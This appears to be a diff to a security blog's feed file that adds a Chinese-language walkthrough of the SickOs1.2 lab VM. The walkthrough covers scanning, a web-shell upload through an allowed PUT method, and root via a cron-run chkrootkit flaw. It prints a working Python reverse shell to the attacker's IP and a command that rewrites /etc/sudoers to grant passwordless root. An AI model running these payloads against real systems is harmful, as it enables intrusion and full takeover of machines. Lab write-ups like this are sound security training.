@@ -4,6 +4,19 @@
   
   
   <entry>
+    <title>SickOs1.2</title>
+    <link href="/2023/12/05/sick/"/>
+    <url>/2023/12/05/sick/</url>
+    
+    <content type="html"><![CDATA[<h3 id="0x00-环境搭建"><a class="header-anchor" href="#0x00-环境搭建">🍭</a>0x00 环境搭建</h3><p>攻击机（kali）：192.168.20.131</p><p>靶机（bulldog2）：192.168.20.142</p><p>靶机ip自动获取</p><h3 id="0x01-信息收集"><a class="header-anchor" href="#0x01-信息收集">🍭</a>0x01 信息收集</h3><p>主机发现</p><pre><code class="hljs angelscript">netdiscover -i eth0 -r <span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span></code></pre><p><img src="/2023/12/05/sick/1.png" alt="1"></p><p>端口扫描</p><pre><code class="hljs angelscript">masscan --rate=<span class="hljs-number">10000</span> -p0<span class="hljs-number">-65535</span> <span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.142</span></code></pre><p><img src="/2023/12/05/sick/2.png" alt="2"></p><p>开放了22、80端口</p><p>目录扫描</p><p><img src="/2023/12/05/sick/3.png" alt="3"></p><p>网站指纹</p><p><img src="/2023/12/05/sick/4.png" alt="4"></p><h3 id="0x02-信息利用"><a class="header-anchor" href="#0x02-信息利用">🍭</a>0x02 信息利用</h3><p>目录扫描出test：</p><p><img src="/2023/12/05/sick/5.png" alt="5"></p><p>目录泄露，还有lighttpd版本，查了一下没有可用的，目录扫描没有扫出其它信息，估计利用点在这个test目录，接下来用OPTIONS来进行请求，**OPTIONS一般是对CORS(跨域资源共享)枚举的 **</p><p><img src="/2023/12/05/sick/6.png" alt="6"></p><p>允许PUT请求，可以试试上传文件：</p><p><img src="/2023/12/05/sick/7.png" alt="7"></p><p>蚁剑连接</p><p><img src="/2023/12/05/sick/8.png" alt="8"></p><h3 id="0x03-提权"><a class="header-anchor" href="#0x03-提权">🍭</a>0x03 提权</h3><p>suid、sudo都没有利用点，去看/etc/cron*下的文件：</p><p><img src="/2023/12/05/sick/9.png" alt="9"></p><p>有一个chkrootkit工具，查看看版本</p><p><img src="/2023/12/05/sick/10.png" alt="10"></p><p>版本有漏洞，看一下说明</p><p><img src="/2023/12/05/sick/11.png" alt="11"></p><p>步骤：<br>1.在/ tmp中放入一个名为’update’的非root所有者的可执行文件。</p><p>2.以root身份运行chkrootkit，其文件/ tmp /update将以root身份执行。<br>如果攻击者知道管理员是定期运行chkrootkit（，并且对/tmp（没有挂载noexec）有写访问权限，就可以获取root权限。</p><p>但测试时发现蚁剑终端无法向update文件中写入将www-date添加到sudo组的命令，这里将反弹shell到kali(测试发现只有8080、443端口允许外联)</p><pre><code class="hljs apache"><span class="hljs-attribute">import</span> socket,subprocess,os<span class="hljs-attribute">s</span>=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<span class="hljs-attribute">s</span>.connect((<span class="hljs-string">&quot;192.168.20.131&quot;</span>,<span class="hljs-number">443</span>))<span class="hljs-attribute">os</span>.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">0</span>)<span class="hljs-attribute">os</span>.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">1</span>)<span class="hljs-attribute">os</span>.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">2</span>)<span class="hljs-attribute">p</span>=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])</code></pre><p>监听</p><p><img src="/2023/12/05/sick/12.png" alt="12"></p><p>将www-date添加到sudo组的命令</p><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> &#x27;chmod +w <span class="hljs-string">/etc/sudoers</span> &amp;&amp; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;www-data ALL=(ALL)  NOPASSWD:ALL&quot;</span> &gt; <span class="hljs-string">/etc/sudoers</span>&#x27; &gt; <span class="hljs-string">/tmp/update</span></code></pre><p><img src="/2023/12/05/sick/13.png" alt="13"></p><p>切换root用户</p><p><img src="/2023/12/05/sick/14.png" alt="14"></p><p>提权成功</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>【vulhub】DeRPnStiNK</title>
     <link href="/2023/11/30/bepnk/"/>
     <url>/2023/11/30/bepnk/</url>
